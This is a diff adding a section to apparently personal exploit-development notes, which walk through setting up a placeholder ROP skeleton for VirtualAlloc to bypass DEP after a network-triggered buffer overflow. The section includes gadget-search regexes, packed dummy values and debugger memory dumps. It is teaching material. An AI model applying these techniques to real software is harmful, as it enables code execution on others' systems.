@@ -67,3 +67,49 @@ push\s+esp[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?ret
 ```
 push\s+esp[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?pop\s+(esi|eax|ebx|ecx|edi|edx)[\s\S]*?ret
 ```
+
+### Preparing the Battle Field
+
+We use [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), which can reserve, commit or change the state of a region of pages in virtual address space of a calling process.
+
+LPVOID VirtualAlloc(
+  [in, optional] LPVOID lpAddress,          1.
+  [in]           SIZE_T dwSize,                          2.
+  [in]           DWORD  flAllocationType,    3.
+  [in]           DWORD  flProtect                  4.
+);
+
+1. memory address
+2. size of memory region, dwSize per page basis []
+3. mem_commit [0x00001000]
+4. Page-Execute-Read-Write [0x00000040]
+
+Now Few Things:
+1. We don't know the virtualAlloc address beforehand;
+2. We don't know the returnAddress, lpAddress of argument beforehand
+3. dwsize, flAllocationType, flProtect contains Null Bytes...
+
+So, we send Dummy Skeleton as inputBuffer and change the values after....
+
+
+```
+va  = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
+va += pack("<L", (0x46464646)) # Shellcode Return Address
+va += pack("<L", (0x47474747)) # # dummy Shellcode Address
+va += pack("<L", (0x48484848)) # dummy dwSize 
+va += pack("<L", (0x49494949)) # # dummy flAllocationType 
+va += pack("<L", (0x51515151)) # dummy flProtect 
+```
+
+Now update the Proof-Of-Concept : and crash it !
+
+```
+> dd esp -1C
+0d39e300  45454545 46464646 00000000 48484848
+0d39e310  00000000 51515151 42424242 43434343
+0d39e320  43434343 43434343 43434343 43434343
+0d39e330  43434343 43434343 43434343 43434343
+0d39e340  43434343 43434343 43434343 43434343
+```
+
+Once the proof of concept is executed, the network packet will trigger the buffer overflow and position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP. The location of the ROP skeleton is correct, but the DWORDs containing 0x47474747 and 0x49494949 were overwritten with null bytes as part of the process to trigger the vulnerability. This won't impact us since we're going to overwrite them again with ROP.
